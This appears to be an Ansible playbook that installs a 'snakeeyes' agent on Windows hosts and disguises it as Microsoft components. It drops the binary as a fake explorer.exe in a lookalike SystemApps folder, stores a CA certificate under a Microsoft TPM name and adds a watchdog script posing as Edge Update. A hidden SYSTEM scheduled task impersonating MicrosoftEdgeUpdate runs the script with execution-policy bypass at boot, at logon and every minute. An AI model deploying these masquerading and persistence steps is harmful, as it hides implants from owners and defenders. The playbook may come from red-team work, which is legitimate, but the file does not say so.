---
- name: Ensure agent directory exists
  ansible.windows.win_file:
    path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\"
    state: directory

- name: Copy Windows agent executable
  ansible.windows.win_copy:
    src: "snakeeyes-windows.exe"
    dest: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"

- name: Ensure cert directory exists
  ansible.windows.win_file:
    path: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\"
    state: directory

- name: Copy CA cert to Windows Host
  ansible.windows.win_copy:
    src: "snakeeyes-ca.crt"
    dest: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\Microsoft_TPM_Network_DSA_Trust.crt"

- name: Deploy watchdog PowerShell script
  ansible.windows.win_copy:
    dest: "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
    content: |
      $exePath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\explorer.exe'
      $logPath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\Testing.log'

      function Write-Log {
          param([string]$Message)
          $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
          Add-Content -Path $logPath -Value "$ts - $Message"
      }

      Write-Log "Watchdog started."

      if (-not (Test-Path $exePath)) {
          Write-Log "ERROR: EXE not found."
          exit 1
      }

      $running = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }

      if ($running) {
          Write-Log "Process already running."
          exit 0
      }

      try {
          Write-Log "Process not running. Starting it now."
          Start-Process -FilePath $exePath
          Start-Sleep -Seconds 5

          $runningAfter = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }

          if ($runningAfter) {
              Write-Log "Process started successfully."
              exit 0
          }
          else {
              Write-Log "ERROR: Start attempted but process not found afterward."
              exit 2
          }
      }
      catch {
          Write-Log "ERROR: $($_.Exception.Message)"
          exit 3
      }

- name: Deploy persistent scheduled task exactly per screenshots
  community.windows.win_scheduled_task:
    name: "MicrosoftEdgeUpdateTaskMachineEN"
    description: "Keeps your Microsoft software up to date. if this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it."
    
    # --- General Tab ---
    username: SYSTEM
    run_level: highest      # "Run with highest privileges"
    logon_type: service_account # "Run whether user is logged on or not"
    hidden: true            # "Hidden" checkbox
    enabled: true

    # --- Actions Tab ---
    actions:
      - path: 'powershell.exe'
        arguments: '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Program Files\Internet Explorer\MicrosoftEdgeUpdate.ps1"'

    # --- Triggers Tab ---
    triggers:
      - type: boot          # "At startup"
      - type: logon         # "At log on"
      - type: daily         # "Daily"
        start_boundary: '2026-03-25T00:00:00'
        repetition:
          interval: PT1M    # Repeat every 5 minutes
          duration: P1D     # For a duration of 1 day (cycles daily)

    # --- Conditions Tab ---
    disallow_start_if_on_batteries: false  # Unchecked: "Start only if on AC power"
    stop_if_going_on_batteries: false      # Unchecked: "Stop if computer switches to battery"
    wake_to_run: false                     # Unchecked: "Wake the computer to run"
    run_only_if_network_available: false   # Unchecked: "Start only if network connection available"
    run_only_if_idle: false                # Unchecked: "Start only if idle"

    # --- Settings Tab ---
    allow_demand_start: true               # Checked: "Allow task to be run on demand"
    start_when_available: true             # Checked: "Run task as soon as possible after missed start"
    restart_count: 0                       # Unchecked: "If the task fails, restart every..."
    execution_time_limit: PT0S             # Unchecked: "Stop the task if it runs longer than..." (0 = Never)
    force_stop: false                      # Unchecked: "If the running task does not end..."
    delete_after: null                     # Unchecked: "If the task is not scheduled to run again..."
    multiple_instances: 2                  # Dropdown: "Do not start a new instance" (IgnoreNew)

    state: present


- name: Run watchdog once immediately
  ansible.windows.win_powershell:
    script: |
      Start-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskMachineEN'